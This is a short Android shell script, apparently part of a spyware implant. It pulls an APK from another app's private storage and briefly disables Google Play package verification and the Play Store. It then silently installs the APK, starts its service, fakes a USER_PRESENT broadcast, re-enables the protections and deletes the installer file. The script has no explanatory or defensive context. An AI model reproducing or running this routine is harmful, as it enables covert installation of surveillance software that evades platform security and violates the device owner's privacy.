
export LD_LIBRARY_PATH=/vendor/lib:/system/lib

rm /sdcard/core.apk
cat /data/data/*/app_qza/core.*.apk > /sdcard/core.apk

settings put global package_verifier_enable 0
pm disable com.android.vending
sleep 1

pm install -r /sdcard/core.apk
sleep 2

am startservice com.android.dvci/.ServiceMain
am broadcast -a android.intent.action.USER_PRESENT

sleep 2
settings put global package_verifier_enable 1
pm enable com.android.vending

rm /sdcard/core.apk






